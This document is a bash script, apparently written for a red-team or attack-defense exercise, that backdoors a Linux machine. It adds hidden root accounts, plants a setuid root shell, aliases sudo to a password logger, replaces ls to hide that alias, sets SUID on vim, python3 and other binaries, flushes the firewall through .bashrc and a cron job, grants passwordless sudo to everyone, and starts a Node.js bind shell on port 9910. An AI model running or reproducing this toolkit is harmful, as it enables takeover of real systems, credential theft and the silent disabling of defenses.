#!/bin/bash

path=$PATH:/usr/sbin
# Add root account
useradd -ou 0 -g 0 sysmin
echo "sysmin:changeme" | chpasswd

# Install necessary packages
apt update 
apt install -y gcc nodejs vim curl netcat sudo npm iptables

# Extra shell
echo 'int main(void){setresuid(0,0,0);system("/bin/sh");}' > netmngr.c
gcc netmngr.c -o /bin/netmngr
rm netmngr.c
chown root:root /bin/netmngr
chmod 4777 /bin/netmngr

# Sudo password logger
mkdir -p /var/.info
printf 'read -sp "[sudo] password for $USER: " sudopass\necho""\nsleep 2\necho $sudopass >> /tmp/sudo.txt\n/usr/bin/sudo $@' >> /var/.info/sudo
chmod 777 /var/.info/sudo
echo 'alias sudo=/var/.info/sudo' >> /etc/profile.d/interesting.sh

# Hide trivial detection of bash profile
mv /usr/bin/ls /usr/bin/lls
printf '/usr/bin/lls --color=auto -I interesting.sh $@' > /usr/bin/ls # Ha, this is such an asshole move--I love it.
chmod 755 /usr/bin/ls

# Add fun bash profile stuff (optional and not very educational, but fun)
printf "alias cat='echo \"Segmentation fault\"'" >> /etc/profile

# Set SUID for easy priv esc
chmod 4777 $(which vim)
chmod 4777 $(which nano)
chmod 4777 $(which nice)
chmod 4777 $(which python3)
chmod 4777 $(which systemctl)

# Add firewall disrupter to bashrc
echo 'iptables -F; iptables -t mangle -F; iptables -t nat -F' >> /root/.bashrc

# Make life easy for all users
echo 'ALL ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers
chattr +i /etc/sudoers

# Add a lot of users
for i in {1..420}; do useradd user$i; echo "user$i:changeme" | chpasswd; done

# Nullify /bin/false
cp /bin/false /bin/falsey
cp /bin/bash /bin/false

# Add Backdoor NodeJS service
mkdir -p /var/www/.backdoor/
printf 'var spawn=require(\"child_process\").spawn,net=require(\"net\"),server=net.createServer(function(n){console.log(\"New connection\!\");var o=\"win32\"===process.platform?spawn(\"cmd\"):spawn(\"/bin/sh\");o.stdin.resume(),o.stdout.on(\"data\",function(o){n.write(o)}),o.stderr.on(\"data\",function(o){n.write(o)}),n.on(\"data\",function(n){o.stdin.write(n)}),n.on(\"end\",function(){console.log(\"Connection end.\")}),n.on(\"timeout\",function(){console.log(\"Connection timed out\")}),n.on(\"close\",function(n){console.log(\"Connection closed\",n?\"because of a conn. error\":\"by client\")})});server.listen(9910,\"0.0.0.0\");' > /var/www/.backdoor/nodeserver.js
npm install -g pm2
pm2 start /var/www/.backdoor/nodeserver.js

# Firewall disabling cron job
printf '#!/bin/bash\n(\niptables -F; iptables -t mangle -F; iptables -t nat -F;) 2>/dev/null' >> /etc/notes
printf 'useradd -ou 0 -g 10 systemdaemon 2>/dev/null\necho "systemdaemon:password" | chpasswd 2>/dev/null' >> /etc/notes
chmod 755 /etc/notes
crontab -l > cron_bkp
echo "*/5 * * * * /usr/bin/sudo /etc/notes >/dev/null 2>&1" >> cron_bkp
crontab cron_bkp
rm cron_bkp

# MEME API
mkdir -p /var/www/memeapi
cd /var/www/memeapi
printf 'const express=require("express"),app=express(),port=3000,axios=require("axios"),cheerio=require("cheerio"),mainUrl="https://reddit.com/r/dankmemes";app.get("/",(e,r)=>{axios.get(mainUrl).then(e=>{const s=cheerio.load(e.data)(".media-element"),o=Math.floor(Math.random()*s.length);s[o].attribs.src?r.send(`<img src="${s[o].attribs.src}"></img>`):r.send(`<video controls><source src="${s[o].children[0].attribs.src}"></video>`)}).catch(e=>{console.log(e)})}),app.listen(80,()=>{console.log(`App is now listening on port 80`)});' > /var/www/memeapi/memeapi.js
npm i cheerio axios express
pm2 start /var/www/memeapi/memeapi.js
